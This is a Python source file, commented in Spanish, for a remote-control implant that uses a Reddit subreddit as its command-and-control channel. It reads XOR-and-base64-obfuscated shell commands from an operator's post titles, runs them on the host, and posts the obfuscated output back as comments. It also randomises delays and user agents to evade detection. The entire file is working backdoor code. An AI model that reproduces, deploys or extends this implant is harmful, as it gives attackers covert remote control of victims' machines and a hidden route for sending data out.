import praw
import time
import subprocess
import re
import random
import string
import base64

# Subreddit y usuario autorizados
SUBREDDIT_NAME = ""
USUARIO_COMANDOS = ""
CLAVE_XOR = ""

# Configura tus credenciales de Reddit
reddit = praw.Reddit(
    client_id='',
    client_secret='',
    username='',
    password='',
    user_agent=''
)


def generar_user_agent():
    plataformas = [
        "Windows NT 10.0; Win64; x64",
        "X11; Linux x86_64",
        "Macintosh; Intel Mac OS X 10_15_7"
    ]
    navegador = random.choice(["Firefox", "Chrome", "Edge"])
    plataforma = random.choice(plataformas)
    build = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
    return f"Mozilla/5.0 ({plataforma}) {navegador}/{build} RedditC2Bot"

def xor_cipher(data: str, key: str = CLAVE_XOR, modo="cifrar") -> str:
    if modo == "cifrar":
        raw = ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))
        return base64.b64encode(raw.encode()).decode()
    elif modo == "descifrar":
        raw = base64.b64decode(data.encode()).decode()
        return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(raw))

def ejecutar_comando(comando):
    print(f"[EJECUTANDO DESCIFRADO] {comando}")
    try:
        output = subprocess.check_output(
            comando, shell=True, stderr=subprocess.STDOUT, timeout=20, text=True
        )
    except subprocess.CalledProcessError as e:
        output = f"[ERROR]\n{e.output}"
    except Exception as e:
        output = f"[EXCEPCION]\n{str(e)}"
    return output[:9500]

def intentar_comentar(post, mensaje):
    while True:
        try:
            espera = random.randint(7, 15)
            print(f"[+] Esperando {espera}s antes de comentar...")
            time.sleep(espera)
            separador = f"<!--sep-{random.randint(1000,9999)}-->"
            mensaje_final = mensaje + f"\n{separador}"
            post.reply(mensaje_final)
            return
        except praw.exceptions.APIException as e:
            error_msg = str(e)
            if "RATELIMIT" in error_msg:
                match = re.search(r"(\d+)\s(second|minute)", error_msg)
                if match:
                    delay = int(match.group(1))
                    if match.group(2) == "minute":
                        delay *= 60
                    print(f"[RATE LIMIT] Esperando {delay} segundos...")
                    time.sleep(delay + random.randint(3, 6))
                else:
                    print("[RATE LIMIT] Esperando 12s por precaucion...")
                    time.sleep(12)
            else:
                raise e


def procesar_posts(subreddit):
    for post in subreddit.new(limit=10):
        if post.author.name != USUARIO_COMANDOS:
            continue
        if post.selftext.strip():
            continue
        post.comments.replace_more(limit=0)
        if any(comment.author.name == reddit.user.me().name for comment in post.comments):
            continue

        try:
            comando = xor_cipher(post.title, modo="descifrar")
            resultado = ejecutar_comando(comando)
            respuesta_cifrada = xor_cipher(resultado, modo="cifrar")
            intentar_comentar(post, respuesta_cifrada)
            print(f"[OK] Respondido post: {post.id}")
        except Exception as e:
            print(f"[ERROR post {post.id}] {e}")

def main():
    try:
        subreddit = reddit.subreddit(SUBREDDIT_NAME)
        print(f"[OK] Agente ejecutor monitorizando r/{SUBREDDIT_NAME}")
    except Exception as e:
        print(f"[ERROR] No se pudo acceder al subreddit: {str(e)}")
        return

    while True:
        try:
            procesar_posts(subreddit)
        except Exception as e:
            print(f"[ERROR ciclo] {e}")
        time.sleep(random.randint(10, 20))

if __name__ == "__main__":
    main()
